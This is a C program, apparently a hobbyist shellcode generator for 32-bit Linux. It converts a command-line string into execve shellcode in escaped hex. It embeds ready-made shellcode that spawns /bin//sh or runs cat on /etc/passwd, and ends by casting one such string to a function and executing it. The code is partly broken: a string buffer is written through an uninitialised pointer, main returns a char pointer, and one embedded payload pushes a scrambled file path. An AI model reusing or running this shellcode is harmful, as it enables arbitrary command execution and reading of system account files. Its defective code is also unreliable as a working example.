#include<stdio.h>
#include<string.h>
#include<stdlib.h>

char ascii[100], new_ascii[100], temp[100];
char my_code[1024];
char *shellcode1_p1 = "\\x31\\xc0\\x50";
char *shellcode2_p1 = "\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80";
char *bash_shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
char *my_cat = 		"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

char *final_shell = "\x31\xc0\x99\x52\x68\x2F\x63\x61\x74\x68\x2F\x62\x69\x6E\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x63\x2F\x70\x61\x68\x2F\x2F\x65\x74\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

char *shellcode1 = "\\x31\\xc0\\x99\\x52";
char *shellcode2 = "\\x89\\xe3\\x52";
char *shellcode3 = "\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80";

                    
char hexDigit(unsigned n)
{
    if (n < 10) {
        return n + '0';
    } else {
        return (n - 10) + 'A';
    }
}
void charToHex(char c, char hex[3])
{
    hex[0] = hexDigit(c / 0x10);
    hex[1] = hexDigit(c % 0x10);
    hex[2] = '\0';
}
void getHex(char *ascii, char output[1024])
{
    int i,c=0;
    char hex[10];
    if(strlen(ascii) % 4 != 0)
        c = 4 - (strlen(ascii) % 4);
    
    strcpy(output, "");
    for(i=0; i<strlen(ascii); i++) {
        while(ascii[i] == '/' && c!=0) {
            charToHex('/', hex);    
            strcat(output, "\\x");
            strcat(output, hex);    
            c--;
        }
        charToHex(ascii[i], hex);
        
        strcat(output, "\\x");
        strcat(output, hex);        
    }
}
char* convert(char *ascii)
{
    int i,c=0;
    char *temp;
    char ch[2];
    strcpy(temp, "");
    if(strlen(ascii) % 4 != 0)
        c = 4 - (strlen(ascii) % 4);
    for(i=0; i<strlen(ascii); i++){
        while(ascii[i] == '/' && c!=0) {
            strcat(temp, "/");
            c--;
        }
        ch[0] = ascii[i];
        ch[1] = '\0';
        strcat(temp,ch);
    }
    while(c>0)
    {
    	strcat(temp, "\0");
    	c--;
    }
    return temp;
}
char* main(int argc, char * argv[])
{
    char output[1024], code[1024];    
    int i=0, j=0, k=0, p=0;
    int n_param=0;
    char data[100][100];
    char *tokens, *val;
    
	FILE *in;
    extern FILE *popen();
    char buff[512];

    if(argc < 2){
        printf("No arguments passed\n");
        exit(1);
    }
    strcpy(ascii, argv[1]);
    

    tokens = strtok(ascii, " ");
    while(tokens != NULL){
    	strcpy(data[n_param], tokens);
	    tokens = strtok(NULL, " ");
	    n_param++;
	}

	if(n_param == 1){
		strcpy(my_code, "");
		strcpy(my_code, shellcode1_p1);
//		printf("%s\n", data[0]);
		val = convert(data[0]);
//		printf("%s\n",val);
		for(i=strlen(val)-4; i>=0; i-=4) {
			for(j=0; j<4; j++) {
				code[j] = val[i+j];
			}
			code[j]='\0';
			strcat(my_code, "\\x68");
//			printf("GET HEX: %s\n",code);				
			getHex(code, output);
//			printf("%s\n",output);
			strcat(my_code, output);
//			printf("%s\n",my_code);
		}
		strcat(my_code, shellcode2_p1);	
	}
	else{
	strcpy(my_code, "");
	strcpy(my_code, shellcode1);
//	printf("%s\n", my_code);
	for(p=0; p<n_param; p++){
		printf("%s\n",data[p]);
		val = convert(data[p]);
//		printf("%s\n",val);		
		if(p==0){
			for(i=strlen(val)-4; i>=0; i-=4) {
				for(j=0; j<4; j++) {
					code[j] = val[i+j];
				}
				code[j]='\0';
				strcat(my_code, "\\x68");
//				printf("GET HEX: %s\n",code);				
				getHex(code, output);
//				printf("%s\n",output);
				strcat(my_code, output);
//				printf("%s\n",my_code);
			}
		}
		else{
			strcat(my_code, shellcode2);
			for(i=strlen(val)-4; i>=0; i-=4) {
				for(j=0; j<4; j++) {
					code[j] = val[i+j];
				}
				code[j]='\0';
				strcat(my_code, "\\x68");
//				printf("GET HEX: %s\n",code);
				
				getHex(code, output);
				strcat(my_code, output);
//				printf("%s\n",my_code);
			}	
		}
	}

	strcat(my_code, shellcode3);
	
	}
    printf("%s\n", my_code);
    

//	sprintf(final_shell, "%s", my_code);
//	printf("%s\n", final_shell);

/*	if(!(in = popen("ls -sail", "r"))){
        exit(1);
    }
    while(fgets(buff, sizeof(buff), in)!=NULL){
        printf("%s", buff);
    }
    pclose(in);
*/
	
    int (*shell)();
    shell = final_shell;
    shell();

    return my_code;
}
